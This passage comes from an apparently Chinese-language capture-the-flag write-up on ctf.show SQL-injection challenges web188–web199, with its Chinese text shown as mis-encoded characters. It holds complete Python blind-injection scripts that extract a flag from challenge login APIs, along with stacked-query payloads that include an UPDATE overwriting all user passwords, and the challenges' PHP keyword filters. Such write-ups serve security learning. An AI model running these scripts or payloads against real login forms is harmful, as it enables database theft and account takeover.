src="/images/web_188.png"></p><p>å¦‚æœusernameä¸æ˜¯ä»¥é¦–å­—æ¯å¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°||è¿ç®—ç¬¦ï¼Œå›åˆ°æœ¬é¢˜ä¸Šï¼š</p><p>ä»¤username=0&amp;pass=0ï¼Œæäº¤ä¸Šå»ï¼Œå‘ç°ç™»å½•æˆåŠŸï¼Œåœ¨è¿”å›åŒ…ä¸­æ‹¿åˆ°flag</p><h4 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h4><p>é¦–å…ˆçœ‹åˆ°çš„æç¤ºæ˜¯flagåœ¨/api/index.phpï¼Œæ— ç–‘æ„Ÿè§‰åˆæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼Œå†æ¬¡å»åˆ°å¤§ä½¬ä»¬å‘çš„wpéœ€è¦ç”¨åˆ°ä¸¤ä¸ªsqlå‡½æ•°</p><p><strong>LOAD_FILE(file_name)ï¼š</strong> è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚</p><p><strong>regexpï¼š</strong> mysqlä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ“ä½œç¬¦</p><p>éœ€è¦é€šè¿‡load_fileæ¥exé…åˆregexpè¿›è¡Œç›²æ³¨ï¼Œé¦–å…ˆéœ€è¦çŸ¥é“æ˜¯å®ƒçš„é»˜è®¤è·¯å¾„ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°â€/var/www/html/api/index.phpâ€,ç„¶åå› ä¸ºå°†username=0&amp;password=0ï¼Œæ˜¾ç¤ºå¯†ç é”™è¯¯ï¼Œè¯´æ˜ä¸å†æ˜¯ä»¥å­—æ¯å¼€å¤´çš„äº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ˜¯å¦æ˜¾ç¤ºå¯†ç é”™è¯¯æ¥åˆ¤æ–­flagä¸­çš„å­—ç¬¦ï¼Œpythonè„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://d8b930e3-c5a3-4689-bb70-ef21d6ca4697.challenge.ctf.show/api/index.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(load_file('/var/www/html/api/index.php')regexp('&#123;0&#125;'),0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">0</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><h4 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h4><p>æ¥åˆ°å¸ƒå°”ç›²æ³¨äº†ï¼Œç”¨æˆ·ç™»å½•æœ‰ä¸¤ç§æç¤ºï¼Œåˆ†åˆ«ä¸ºå¯†ç é”™è¯¯å’Œç”¨æˆ·åä¸å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸¤ç§ä¸åŒçš„é¡µé¢æç¤ºæ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œå°±ç›´æ¥æ‹¿ç¾¤ä¸»ç»™çš„è„šæœ¬è·‘äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://eb10e675-47ac-44bf-8c00-b6fc6758b105.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token comment">#payload = "admin'and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_fl0g</span>        <span class="token comment">#payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii&#x2F;i&#39;, $username))&#123;        $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;        die(json_encode($ret));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå°†asciiå‡½æ•°ç»™è¿‡æ»¤äº†ï¼Œä½†è¿˜å¯ä»¥ç”¨ordå‡½æ•°ï¼Œè„šæœ¬å¦‚ä¸‹;</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://7b724992-d4d4-48eb-92fc-26c2b6730247.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token comment">#payload = "admin'and (ord(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#ctfshow_fl0g</span>        <span class="token comment">#payload = "admin'and (ord(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))&lt;&#123;&#125;)#".format(i,mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><p>ã€</p><h4 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex&#x2F;i&#39;, $username))&#123;        $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;        die(json_encode($ret));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡åˆå¢åŠ äº†ordå‡½æ•°ç­‰ï¼Œä½†å¯ä»¥ç”¨æ­£åˆ™åŒ¹é…ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://68d3acf9-c16e-46de-8e51-73aea422d994.challenge.ctf.show/api/"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        <span class="token comment">#payload = f"admin'and if(substr((select database()),&#123;&#125;,1))regexp('&#123;j&#125;'),1,0)=1#"</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = f"admin'and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))regexp('&#123;j&#125;'),1,0)=1#"</span>        <span class="token comment">#ctfshow_fl0g</span>        <span class="token comment">#payload = f"admin'and if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))regexp('&#123;j&#125;'),1,0)=1#"</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin'and if(substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr&#x2F;i&#39;, $username))&#123;        $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;        die(json_encode($ret));    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡å°†substrä¹Ÿè¿‡æ»¤äº†ï¼Œä½†å¯ä»¥ç”¨like</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport sysimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;37c2ceb1-a3e7-4a7b-a1ba-0617e56fa226.challenge.ctf.show&#x2F;api&#x2F;&quot;dict &#x3D; &quot;&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm_,&quot;flag &#x3D; &quot;&quot;for i in range(1,55):    for j in dict:        pay &#x3D; flag + j + &#39;%&#39;        #payload &#x3D; f&quot;admin&#39;and if((select database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_web        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_flxg        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #id,f1ag        payload &#x3D; f&quot;admin&#39;and if((select f1ag from ctfshow_flxg) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        data &#x3D; &#123;            &quot;username&quot;: payload,            &quot;password&quot;: 1        &#125;        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        time.sleep(0.3)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag &#x3D; flag + j            print(flag)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;file|into|ascii|ord|hex|substr|char|left|right|substring&#x2F;i&#39;, $username))&#123;       $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;       die(json_encode($ret));   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜è™½ç„¶å¢åŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œä½†ä¾æ—§æ²¡æœ‰è¿‡æ»¤likeï¼Œæ‰€ä»¥è€è§„çŸ©ï¼Œç›´æ¥ç”¨ä¸Šä¸€é¢˜çš„è„šæœ¬ï¼š</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport sysimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;75beca13-5fe5-4ad9-bb11-9ffea4b1a791.challenge.ctf.show&#x2F;api&#x2F;&quot;dict &#x3D; &quot;&#123;&#125;1234567890qwerty-uiopasdfghjklzxcvbnm_,&quot;flag &#x3D; &quot;&quot;for i in range(1,55):    for j in dict:        pay &#x3D; flag + j + &#39;%&#39;        #payload &#x3D; f&quot;admin&#39;and if((select database()) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_web        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctfshow_web&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #ctfshow_flxg        #payload &#x3D; f&quot;admin&#39;and if((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        #id,f1ag        payload &#x3D; f&quot;admin&#39;and if((select f1ag from ctfshow_flxg) like &#39;&#123;pay&#125;&#39;,1,0)#&quot;        data &#x3D; &#123;            &quot;username&quot;: payload,            &quot;password&quot;: 1        &#125;        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        time.sleep(0.3)        if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:            flag &#x3D; flag + j            print(flag)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><h4 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h4><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¢˜ç›®è¯´çš„æ˜¯å †å æ³¨å…¥</p><p>å †å æ³¨å…¥ï¼šå †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡sqlè¯­å¥ï¼Œè¯­å¥ä¹‹é—´ä»¥åˆ†å·(;)éš”å¼€ã€‚è€Œå †å æŸ¥è¯¢æ³¨å…¥æ”»å‡»å°±æ˜¯åˆ©ç”¨æ­¤ç‰¹ç‚¹ï¼Œåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­æ„é€ è‡ªå·±è¦æ‰§è¡Œçš„è¯­å¥ã€‚</p><p>è€Œé¢˜ç›®ä¸­ç»™çš„åˆ¤æ–­æ˜¯åªè¦ç™»å½•æˆåŠŸå°±ä¼šç»™flagï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨updateå°†passæ›´æ–°ä¸ºæˆ‘ä»¬è‡ªå·±è®¾ç½®çš„å¯†ç ï¼Œè™½ç„¶é¢˜ç›®ä¸­å°†ç©ºæ ¼è¿‡æ»¤äº†ï¼Œä½†å¯ä»¥ç”¨åå¼•å·`è¿›è¡Œéš”å¼€ï¼Œå¹¶ä¸”å› ä¸ºé¢˜ä¸­çš„sqlçš„usernameçš„å€¼å¹¶æ²¡æœ‰ç”¨å•å¼•å·éš”å¼€ï¼Œæ‰€ä»¥éœ€è¦ä¸ºæ•°å­—å³å¯ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">username:0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;123456password:123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;  die(json_encode($ret));&#125;if(strlen($username)&gt;16)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åä¸èƒ½è¶…è¿‡16ä¸ªå­—ç¬¦&#39;;  die(json_encode($ret));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡å¯¹usernameçš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œçœ‹äº†wpæ‰çŸ¥é“é¢˜ç›®ä¸­è¿‡æ»¤çš„æ˜¯se1ectï¼Œå¹¶æœªè¿‡æ»¤selectï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨selectï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">username:1;select(22)password:22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set&#x2F;&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹äº†å—ç¥çš„wpï¼Œè¿˜å¯ä»¥ç”¨showå‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬å·²çŸ¥ä¸€ä¸ªè¡¨åï¼Œæ‰€ä»¥ç”¨show tables åˆ—å‡ºæ‰€æœ‰è¡¨åï¼Œå¯†ç è¾“å…¥æˆ‘ä»¬å·²çŸ¥çš„è¡¨åå³å¯ç™»å½•æˆåŠŸpayload:</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop&#x2F;i&#39;, $username))&#123;   $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;   die(json_encode($ret)); &#125; if($row[0]&#x3D;&#x3D;$password)&#123;     $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜è™½ç„¶å†æ¬¡å¢åŠ äº†ä¸€äº›è¿‡æ»¤ï¼Œä½†ä¾æ—§æ²¡æœ‰è¿‡æ»¤showï¼Œç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„payload</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h4><pre class="line-numbers language-none"><code class="language-none">if(&#39;&#x2F;\*|\#|\-|\x23|\&#39;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(&#x2F;i&#39;, $username))&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;ç”¨æˆ·åéæ³•&#39;;    die(json_encode($ret));  &#125;  if($row[0]&#x3D;&#x3D;$password)&#123;      $ret[&#39;msg&#39;]&#x3D;&quot;ç™»é™†æˆåŠŸ flag is $flag&quot;;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­ä¸Šä¸€é¢˜çš„payload</p><pre class="line-numbers language-none"><code class="language-none">username:1;show tablespassword:ctfshow_user<span 